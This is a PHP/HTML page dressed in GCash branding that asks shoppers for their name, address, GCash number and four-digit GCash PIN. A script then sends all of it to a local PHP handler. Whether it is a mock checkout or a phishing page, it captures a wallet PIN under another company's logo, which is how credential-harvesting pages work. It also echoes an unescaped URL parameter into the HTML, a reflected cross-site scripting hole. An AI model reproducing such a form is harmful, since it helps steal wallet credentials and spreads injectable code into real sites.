<?php
// Get the total price from the URL
$total_price = $_GET['total_price'] ?? 0;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GCash Payment</title>
    <link rel="icon" href="gcashlogo.png" type="image/x-icon">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">

   <style>
        body {
            background-color: #022DB8;
            font-family: 'Poppins', sans-serif;
        }
        .gcash-container {
            background-color: #007DFE; /* GCash Blue */
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            margin: auto;
            color: #fff; /* White text inside the container */
        }
        .gcash-header {
            text-align: center;
            margin-bottom: 20px;
        }
        .gcash-header h2 {
            font-size: 24px;
            font-weight: bold;
        }
        .gcash-header p {
            font-size: 14px;
        }
        .gcash-logo {
            display: block;
            margin: 0 auto 15px;
            width: 60px;
        }
        .gcash-button {
            background-color: #fff;
            color: #004C99;
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .gcash-button:hover {
            background-color: blue;
            color: white;
        }
        .form-label {
            color: #fff;
        }
        .gcash-footer {
            text-align: center;
            font-size: 14px;
            color: #ddd;
            margin-top: 20px;
        }
        /* Loading Spinner */
        .spinner {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border: 8px solid #F8D0C8;
            border-top: 8px solid #B0C6B5;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Centering the spinner */
        .loading-container {
            position: relative;
        }
    </style>
</head>
<body>
<div class="container mt-5">
    <div class="gcash-container">
        <div class="gcash-header">
            <!-- GCash Logo -->
            <img src="gcashlogo.png" alt="GCash Logo" class="gcash-logo">
            <h2>GCash Payment</h2>
            <p>Please enter your GCash and delivery details to complete the payment.</p>
        </div>

        <form id="gcashForm" method="POST" class="loading-container">
            <div class="mb-3">
                <label for="fullname" class="form-label" autocomplete="off">Full Name</label>
                <input type="text" id="fullname" name="fullname" class="form-control" placeholder="Enter your full name" 
       autocomplete="new-password" value="" required 
       onfocus="this.removeAttribute('readonly');" readonly 
       oninput="this.value = this.value.replace(/[^a-zA-Z\s]/g, '');">
                </div>
            <div class="mb-3">
                <label for="phone" class="form-label">Phone Number</label>
                <input type="tel" id="phone" name="phone" class="form-control" placeholder="Enter your phone number" pattern="\d{11,}" required oninput="validatePhoneNumber(event)">
            </div>
            <div class="mb-3">
                <label for="address" class="form-label">Address</label>
                <textarea id="address" name="address" class="form-control" rows="3" placeholder="Enter your delivery address" required></textarea>
            </div>
            <div class="mb-3">
                <label for="gcashNumber" class="form-label">GCash Number</label>
                <input type="text" id="gcashNumber" name="gcashNumber" class="form-control" placeholder="Enter your GCash number" pattern="\d{11}" required oninput="validateNumbers(event)">
            </div>
            <div class="mb-3">
                <label for="gcashPin" class="form-label">GCash PIN</label>
                <input type="password" id="gcashPin" name="gcashPin" class="form-control" placeholder="Enter your GCash PIN"
       autocomplete="off" pattern="\d{4}" required 
       onfocus="this.setAttribute('autocomplete', 'new-password'); this.removeAttribute('readonly');" 
       readonly inputmode="numeric" oninput="validateNumbers(event)">
            </div>
            <div class="mb-3">
                <label for="totalPrice" class="form-label">Order Total</label>
                <input type="text" id="totalPrice" name="totalPrice" class="form-control" value="₱<?php echo number_format($total_price, 2); ?>" disabled>
                <input type="hidden" name="totalPriceValue" value="<?php echo $total_price; ?>">
            </div>
            <button type="button" class="gcash-button" onclick="submitPayment()">Submit Payment</button>

            <!-- Loading Spinner -->
            <div class="spinner" id="loadingSpinner"></div>
        </form>

        <div class="gcash-footer">
            <p>By submitting, you agree to the <a href="#" style="color: #fff;">Terms & Conditions</a> of GCash.</p>
        </div>
    </div>
</div>

<script>
    // Function to restrict non-numeric input for phone number and GCash number/PIN
    function validatePhoneNumber(event) {
        const input = event.target;
        input.value = input.value.replace(/[^\d]/g, ''); // Remove non-numeric characters
    }

    function validateNumbers(event) {
        const input = event.target;
        input.value = input.value.replace(/[^\d]/g, ''); // Remove non-numeric characters
    }

    function submitPayment() {
        const fullname = document.getElementById('fullname').value;
        const phone = document.getElementById('phone').value;
        const address = document.getElementById('address').value;
        const gcashNumber = document.getElementById('gcashNumber').value;
        const gcashPin = document.getElementById('gcashPin').value;
        const totalPrice = document.querySelector('input[name="totalPriceValue"]').value;

        // Show loading spinner
        document.getElementById('loadingSpinner').style.display = 'block';
        document.querySelector('.gcash-button').disabled = true;

        // Validate fields
        if (!fullname || !phone || !address || !gcashNumber || !gcashPin) {
            alert('Please fill in all the required fields.');
            document.getElementById('loadingSpinner').style.display = 'none';
            document.querySelector('.gcash-button').disabled = false;
            return;
        }

        const xhr = new XMLHttpRequest();
        xhr.open("POST", "process_gcash_payment.php", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

        xhr.onload = function () {
            // Hide the loading spinner
            document.getElementById('loadingSpinner').style.display = 'none';
            document.querySelector('.gcash-button').disabled = false;

            if (xhr.status === 200) {
                const response = JSON.parse(xhr.responseText);
                if (response.status === 'success') {
                    alert('Payment successful! Redirecting...');
                    window.location.href = response.redirect;
                } else {
                    alert(response.message || 'Payment failed! Please try again.');
                }
            } else {
                alert('An error occurred while processing your payment.');
            }
        };

        xhr.send(`fullname=${fullname}&phone=${phone}&address=${address}&gcashNumber=${gcashNumber}&gcashPin=${gcashPin}&totalPrice=${totalPrice}`);
    }
</script>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js"></script>
</body>
</html>
